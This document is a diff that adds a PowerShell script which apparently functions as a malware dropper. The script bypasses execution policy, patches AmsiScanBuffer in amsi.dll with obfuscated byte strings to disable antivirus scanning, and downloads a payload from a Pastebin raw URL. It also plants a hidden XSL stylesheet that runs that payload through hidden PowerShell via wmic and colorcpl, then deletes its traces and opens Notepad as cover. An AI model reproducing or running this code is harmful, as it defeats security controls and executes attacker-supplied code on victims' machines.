@@ -1,0 +1,121 @@
+Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
+$c = 't'
+$Win32 = @"
+using System.Runtime.InteropServices;
+using System;
+
+public class Win32 {
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
+Add-Type $Win32
+
+$nowhere = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)
+$LoadLibrary = [Win32]::LoadLibrary([System.Text.Encoding]::ASCII.GetString($nowhere))
+
+$somewhere = [Byte[]](0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)
+$notaddress = [Win32]::GetProcAddress($LoadLibrary, [System.Text.Encoding]::ASCII.GetString($somewhere))
+
+$notp = 0
+$replace = 'VirtualProtec'
+[Win32]::('{0}{1}' -f $replace, $c)($notaddress, [uint32]5, 0x40, [ref]$notp)
+
+$stopitplease = [Byte[]](0xB8, 0x57, 0x00, 0x17, 0x20, 0x35, 0x8A, 0x53, 0x34, 0x1D, 0x05, 0x7A, 0xAC, 0xE3, 0x42, 0xC3)
+$marshalClass = [System.Runtime.InteropServices.Marshal]
+$marshalClass::Copy($stopitplease, 0, $notaddress, $stopitplease.Length)
+
+$CacheDirectory = "C:\cache"
+if (-not (Test-Path $CacheDirectory)) {
+    New-Item -Path $CacheDirectory -ItemType Directory
+}
+
+# Create error.xsl file
+$ErrorXslContent = @"
+<?xml version='1.0'?>
+<stylesheet
+xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
+xmlns:user="placeholder"
+version="1.0">
+<output method="text"/>
+	<ms:script implements-prefix="user" language="JScript">
+    	<![CDATA[
+	var shell = new ActiveXObject("WScript.Shell");
+	var pathToLogsGmmp = "C:\\Windows\\System32\\spool\\drivers\\color\\logs.gmmp";
+	shell.Run("powershell.exe -WindowStyle Hidden -Command \"& { Get-Content '" + pathToLogsGmmp + "' | Invoke-Expression }\"", 0, false);
+    ]]>
+</ms:script>
+
+</stylesheet>
+"@
+
+$ErrorXslPath = Join-Path -Path $CacheDirectory -ChildPath "error.xsl"
+$ErrorXslContent | Out-File -FilePath $ErrorXslPath -Encoding ASCII
+
+$ErrorXslItem = Get-Item -Path $ErrorXslPath
+$ErrorXslItem.Attributes = "ReadOnly", "Hidden"
+
+# Retrieve content of logs.gmmp from Pastebin
+$LogsXslContent = Invoke-RestMethod -Uri "https://pastebin.com/raw/7ajTMCPD"
+
+# Write content to logs.gmmp
+$LogsXslPath = Join-Path -Path $CacheDirectory -ChildPath "logs.gmmp"
+$LogsXslContent | Out-File -FilePath $LogsXslPath -Encoding ASCII
+
+$LogsXslItem = Get-Item -Path $LogsXslPath
+$LogsXslItem.Attributes = "ReadOnly", "Hidden"
+
+# Create shortcut with minimized mode and Explorer icon
+$ShortcutPath = Join-Path -Path $CacheDirectory -ChildPath "start.lnk"
+$TargetPath = "wmic"
+$Arguments = "os get /FORMAT:`"C:\Windows\System32\spool\drivers\color\error.xsl`""
+$WScriptShell = New-Object -ComObject WScript.Shell
+$Shortcut = $WScriptShell.CreateShortcut($ShortcutPath)
+$Shortcut.TargetPath = $TargetPath
+$Shortcut.Arguments = $Arguments
+$Shortcut.WindowStyle = 7 # Minimized mode
+$Shortcut.IconLocation = "explorer.exe,22"
+$Shortcut.Save()
+
+
+# Change current terminal location to C drive cache folder
+Set-Location -Path $CacheDirectory
+
+# Run colorcpl command on error.xsl, logs.gmmp, and start.lnk
+colorcpl error.xsl
+colorcpl logs.gmmp
+colorcpl start.lnk
+
+# Wait for a short period to ensure processes release the cache directory
+Start-Sleep -Seconds 1
+
+# Remove error.xsl, logs.gmmp, and start.lnk files if they exist
+$ErrorXslFile = Join-Path -Path $CacheDirectory -ChildPath "error.xsl"
+$LogsXslFile = Join-Path -Path $CacheDirectory -ChildPath "logs.gmmp"
+$ShortcutFile = Join-Path -Path $CacheDirectory -ChildPath "start.lnk"
+
+if (Test-Path $ErrorXslFile) {
+    Remove-Item -Path $ErrorXslFile -Force
+}
+
+if (Test-Path $LogsXslFile) {
+    Remove-Item -Path $LogsXslFile -Force
+}
+
+if (Test-Path $ShortcutFile) {
+    Remove-Item -Path $ShortcutFile -Force
+}
+
+# Remove the cache folder
+try {
+    [System.IO.Directory]::Delete($CacheDirectory, $true)
+} catch {
+    Write-Host "Failed to delete the cache directory: $_"
+}
+
+
+Start Notepad
